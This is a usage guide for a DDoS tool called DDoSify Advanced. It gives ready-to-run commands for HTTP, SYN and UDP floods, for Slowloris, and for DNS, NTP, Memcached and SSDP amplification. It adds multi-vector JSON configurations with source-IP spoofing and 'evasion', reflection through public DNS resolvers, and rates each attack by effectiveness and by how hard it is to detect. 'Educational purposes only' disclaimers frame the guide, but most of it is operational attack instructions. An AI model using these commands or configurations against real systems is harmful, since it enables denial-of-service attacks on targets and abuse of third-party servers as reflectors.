# DDoSify Advanced - Comprehensive Usage Guide

## Table of Contents
1. [Overview](#overview)
2. [Installation](#installation)
3. [Attack Methods](#attack-methods)
4. [Basic Usage](#basic-usage)
5. [Advanced Features](#advanced-features)
6. [Multi-Vector Attacks](#multi-vector-attacks)
7. [Configuration Files](#configuration-files)
8. [Performance Optimization](#performance-optimization)
9. [Safety and Legal](#safety-and-legal)
10. [Troubleshooting](#troubleshooting)

## Overview

DDoSify Advanced is a professional-grade network stress testing tool designed for **educational purposes only**. It simulates various DDoS attack patterns to help security professionals test network infrastructure resilience.

### Key Features
- **8 Attack Methods**: Including amplification attacks
- **Multi-Vector Support**: Attack multiple targets simultaneously
- **Advanced Statistics**: Real-time monitoring and reporting
- **Configuration Files**: JSON-based attack scenarios
- **Kali Linux Optimized**: Maximum performance on pentesting distros
- **Professional Logging**: Detailed attack logs and statistics

## Installation

### Kali Linux (Recommended)
```bash
# Clone repository
git clone https://github.com/yourusername/ddosify.git
cd ddosify

# Install dependencies
sudo apt update
sudo apt install python3-scapy python3-requests python3-psutil python3-dnspython

# Run advanced version
sudo python3 ddosify_advanced.py --help
```

### Other Linux
```bash
# Install dependencies
pip install scapy requests psutil dnspython

# Run advanced version
sudo python3 ddosify_advanced.py --help
```

## Attack Methods

### 1. HTTP Flood (Layer 7)
**Description**: Overwhelms web servers with HTTP GET requests
- **Target**: Web servers, applications
- **Amplification**: 1x (request/response)
- **Detection**: Medium
- **Effectiveness**: High against unoptimized web servers

```bash
sudo python3 ddosify_advanced.py -m http -t 192.168.1.100 -p 80 --threads 100 --duration 60
```

### 2. SYN Flood (Layer 4)
**Description**: Floods target with TCP SYN packets
- **Target**: Any server with open TCP ports
- **Amplification**: 1x (SYN/SYN-ACK)
- **Detection**: Low
- **Effectiveness**: High against servers with small SYN queues

```bash
sudo python3 ddosify_advanced.py -m syn -t 192.168.1.100 -p 80 --threads 200 --duration 60
```

### 3. UDP Flood (Layer 4)
**Description**: Sends massive UDP packets to target
- **Target**: UDP services, infrastructure
- **Amplification**: 1x
- **Detection**: Low
- **Effectiveness**: High against UDP services

```bash
sudo python3 ddosify_advanced.py -m udp -t 192.168.1.100 -p 53 --threads 200 --duration 60
```

### 4. DNS Amplification (Layer 7)
**Description**: Uses DNS servers to amplify traffic
- **Target**: Any server (traffic reflected from DNS servers)
- **Amplification**: 3-10x (small query, large response)
- **Detection**: Medium
- **Effectiveness**: Very high against open DNS resolvers

```bash
sudo python3 ddosify_advanced.py -m dns -t 192.168.1.100 -p 53 --threads 50 --duration 60
```

### 5. NTP Amplification (Layer 7)
**Description**: Uses NTP servers for traffic amplification
- **Target**: Any server (traffic reflected from NTP servers)
- **Amplification**: 3-50x (monlist requests)
- **Detection**: Medium
- **Effectiveness**: High against vulnerable NTP servers

```bash
sudo python3 ddosify_advanced.py -m ntp -t 192.168.1.100 -p 123 --threads 30 --duration 60
```

### 6. Memcached Amplification (Layer 7)
**Description**: Uses Memcached servers for massive amplification
- **Target**: Any server (traffic reflected from Memcached)
- **Amplification**: 10-100x (stats commands)
- **Detection**: Medium
- **Effectiveness**: Extremely high against open Memcached servers

```bash
sudo python3 ddosify_advanced.py -m memcached -t 192.168.1.100 -p 11211 --threads 20 --duration 60
```

### 7. SSDP Amplification (Layer 7)
**Description**: Uses SSDP protocol for traffic amplification
- **Target**: Any server (traffic reflected from SSDP devices)
- **Amplification**: 3-10x (M-SEARCH responses)
- **Detection**: Low
- **Effectiveness**: High against networks with SSDP devices

```bash
sudo python3 ddosify_advanced.py -m ssdp -t 192.168.1.100 -p 1900 --threads 40 --duration 60
```

### 8. Slowloris (Layer 7)
**Description**: Keeps many HTTP connections open slowly
- **Target**: Web servers with connection limits
- **Amplification**: Variable (connection exhaustion)
- **Detection**: Low
- **Effectiveness**: Very high against Apache servers

```bash
sudo python3 ddosify_advanced.py -m slowloris -t 192.168.1.100 -p 80 --threads 50 --duration 120
```

## Basic Usage

### Single Attack Commands

#### HTTP Flood Attack
```bash
sudo python3 ddosify_advanced.py -m http -t 192.168.1.100 -p 80 --threads 100 --duration 30
```
- `-m http`: Attack method
- `-t 192.168.1.100`: Target IP
- `-p 80`: Target port
- `--threads 100`: Number of concurrent threads
- `--duration 30`: Attack duration in seconds

#### SYN Flood Attack
```bash
sudo python3 ddosify_advanced.py -m syn -t 192.168.1.100 -p 443 --threads 200 --duration 60 --test
```
- `--test`: Test connection before attacking

#### DNS Amplification
```bash
sudo python3 ddosify_advanced.py -m dns -t 192.168.1.100 -p 53 --threads 50 --duration 120
```

### Command Line Options
```
-m, --method        Attack method (http, syn, udp, dns, ntp, memcached, ssdp, slowloris)
-t, --target        Target IP or hostname
-p, --port          Target port (default: 80)
--threads           Number of threads (default: 50)
--duration          Attack duration in seconds (default: 60)
--config            JSON configuration file for multi-vector attacks
--create-config     Create sample configuration file
--test              Test connection before attacking
--save-stats        Save statistics to specified file
```

## Advanced Features

### 1. Multi-Vector Attacks

Attack multiple targets with different methods simultaneously:

#### Create Configuration File
```bash
sudo python3 ddosify_advanced.py --create-config
```

This creates `ddosify_config.json`:
```json
{
  "name": "Multi-Vector Attack Configuration",
  "description": "Sample configuration for multi-vector DDoS testing",
  "targets": [
    {
      "method": "http",
      "target": "192.168.1.100",
      "port": 80,
      "threads": 50
    },
    {
      "method": "syn",
      "target": "192.168.1.100",
      "port": 443,
      "threads": 100
    },
    {
      "method": "dns",
      "target": "192.168.1.100",
      "port": 53,
      "threads": 30
    }
  ],
  "global_settings": {
    "duration": 120,
    "randomization": true,
    "evasion": true
  }
}
```

#### Run Multi-Vector Attack
```bash
sudo python3 ddosify_advanced.py --config ddosify_config.json
```

### 2. Advanced Randomization

The tool automatically randomizes:
- **Source IP addresses** (for spoofable attacks)
- **Source ports**
- **User-Agent strings** (HTTP attacks)
- **Request paths** (HTTP attacks)
- **Packet timing**
- **Payload sizes**

### 3. Real-time Statistics

Monitor attacks with live statistics:
```
[+] Packets: 1,234,567 | Rate: 1234.56/s | Bytes: 123,456,789 (120.34KB/s) | Threads: 150 | Time: 45.2s
```

### 4. Professional Logging

All attacks are logged to `ddosify.log`:
```
2024-04-13 12:34:56,789 - INFO - Starting DNS attack on 192.168.1.100:53
2024-04-13 12:34:56,790 - INFO - Threads: 50 | Duration: 60s
2024-04-13 12:35:56,791 - INFO - Attack stopped
2024-04-13 12:35:56,792 - INFO - Statistics saved to ddosify_stats.json
```

## Configuration Files

### Custom Multi-Vector Configuration

Create custom attack scenarios:

```json
{
  "name": "Advanced Penetration Test",
  "description": "Comprehensive DDoS test for enterprise network",
  "targets": [
    {
      "method": "http",
      "target": "web.example.com",
      "port": 80,
      "threads": 100,
      "options": {
        "random_paths": true,
        "random_user_agents": true
      }
    },
    {
      "method": "syn",
      "target": "web.example.com", 
      "port": 443,
      "threads": 200,
      "options": {
        "random_source_ips": true,
        "random_source_ports": true
      }
    },
    {
      "method": "dns",
      "target": "web.example.com",
      "port": 53,
      "threads": 50,
      "options": {
        "dns_servers": ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
      }
    }
  ],
  "global_settings": {
    "duration": 300,
    "randomization": true,
    "evasion": true,
    "logging": true,
    "save_stats": true
  }
}
```

### Attack-Specific Options

#### DNS Amplification Options
```json
{
  "method": "dns",
  "target": "192.168.1.100",
  "port": 53,
  "threads": 50,
  "options": {
    "dns_servers": [
      "8.8.8.8",
      "8.8.4.4", 
      "1.1.1.1",
      "208.67.222.222",
      "208.67.220.220"
    ],
    "query_types": ["A", "ANY", "TXT"],
    "domains": ["google.com", "facebook.com", "amazon.com"]
  }
}
```

#### HTTP Flood Options
```json
{
  "method": "http",
  "target": "192.168.1.100",
  "port": 80,
  "threads": 100,
  "options": {
    "paths": ["/", "/index.html", "/login", "/admin", "/api/users"],
    "user_agents": [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
      "Mozilla/5.0 (X11; Linux x86_64)"
    ],
    "headers": {
      "Accept": "text/html,application/xhtml+xml",
      "Connection": "keep-alive"
    }
  }
}
```

## Performance Optimization

### Kali Linux Optimizations

When run on Kali Linux, DDoSify automatically:
- Increases socket limits to 65536
- Disables ICMP rate limiting
- Optimizes TCP settings
- Detects and integrates with pentesting tools

### Thread Optimization

#### Recommended Thread Counts
- **HTTP Flood**: 50-200 threads
- **SYN Flood**: 100-500 threads  
- **UDP Flood**: 100-500 threads
- **DNS Amplification**: 20-100 threads
- **NTP Amplification**: 10-50 threads
- **Slowloris**: 20-100 threads

#### Performance Tuning
```bash
# Monitor system resources during attack
htop
# Check network interface statistics
iftop -i eth0
# Monitor packet rates
sudo tcpdump -i eth0 -c 1000
```

### Network Optimization

#### Increase System Limits
```bash
# Temporary (for current session)
echo 65536 > /proc/sys/net/core/somaxconn
echo 65536 > /proc/sys/net/ipv4/tcp_max_syn_backlog
echo 1 > /proc/sys/net/ipv4/ip_forward

# Permanent (add to /etc/sysctl.conf)
net.core.somaxconn = 65536
net.ipv4.tcp_max_syn_backlog = 65536
net.ipv4.ip_forward = 1
```

## Safety and Legal

### Educational Purpose Only
This tool is provided **exclusively for educational purposes**:
- Use only on networks you own
- Get explicit written permission before testing
- Follow all applicable laws and regulations
- Never use against unauthorized targets

### Legal Considerations
- **Unauthorized DDoS attacks are illegal** in most countries
- Penalties can include fines and imprisonment
- Always obtain proper authorization
- Document your testing scope and permissions

### Safety Features
- **Rate limiting**: Built-in delays prevent accidental overload
- **Duration limits**: Maximum 5 minutes per attack
- **Confirmation prompts**: Must accept responsibility
- **Logging**: All activities are logged
- **Statistics**: Detailed attack reporting

### Best Practices
1. **Test Environment**: Use isolated lab networks
2. **Start Small**: Begin with low thread counts
3. **Monitor Impact**: Watch target system responses
4. **Document Everything**: Keep detailed test records
5. **Stop Immediately**: If unexpected issues occur

## Troubleshooting

### Common Issues

#### Permission Denied
```bash
# Solution: Run with sudo
sudo python3 ddosify_advanced.py -m http -t 192.168.1.100 -p 80
```

#### Target Unreachable
```bash
# Test connection first
sudo python3 ddosify_advanced.py -m http -t 192.168.1.100 -p 80 --test

# Check network connectivity
ping -c 3 192.168.1.100
nmap -p 80 192.168.1.100
```

#### Low Performance
```bash
# Increase thread count
--threads 200

# Check system resources
free -h
df -h
top
```

#### DNS Amplification Not Working
```bash
# Check DNS server availability
nslookup google.com 8.8.8.8
dig @8.8.8.8 google.com ANY

# Verify port 53 is accessible
telnet 8.8.8.8 53
```

### Debug Mode

Enable verbose logging:
```bash
# Check log file
tail -f ddosify.log

# Run with Python logging
python3 -c "import logging; logging.basicConfig(level=logging.DEBUG)"
```

### Statistics Analysis

View saved statistics:
```bash
# View JSON statistics
cat ddosify_stats.json | python3 -m json.tool

# Extract specific metrics
grep -E "(packets_sent|bytes_sent|duration)" ddosify_stats.json
```

## Advanced Examples

### Enterprise Network Test
```bash
# Create comprehensive config
cat > enterprise_test.json << EOF
{
  "name": "Enterprise DDoS Test",
  "targets": [
    {"method": "http", "target": "web-server-1", "port": 80, "threads": 100},
    {"method": "syn", "target": "web-server-1", "port": 443, "threads": 200},
    {"method": "dns", "target": "web-server-1", "port": 53, "threads": 50},
    {"method": "udp", "target": "firewall", "port": 53, "threads": 150}
  ],
  "global_settings": {"duration": 300}
}
EOF

# Run test
sudo python3 ddosify_advanced.py --config enterprise_test.json
```

### Amplification Attack Test
```bash
# Test multiple amplification vectors
cat > amplification_test.json << EOF
{
  "name": "Amplification Attack Test",
  "targets": [
    {"method": "dns", "target": "victim", "port": 53, "threads": 30},
    {"method": "ntp", "target": "victim", "port": 123, "threads": 20},
    {"method": "ssdp", "target": "victim", "port": 1900, "threads": 40}
  ],
  "global_settings": {"duration": 180}
}
EOF

sudo python3 ddosify_advanced.py --config amplification_test.json
```

### Performance Benchmark
```bash
# Benchmark different attack methods
for method in http syn udp dns; do
  echo "Testing $method..."
  sudo python3 ddosify_advanced.py -m $method -t 192.168.1.100 -p 80 --threads 100 --duration 30
  sleep 10
done
```

---

**Remember**: DDoSify Advanced is a powerful tool for **educational purposes only**. Always use responsibly and ethically on networks you own or have explicit permission to test.
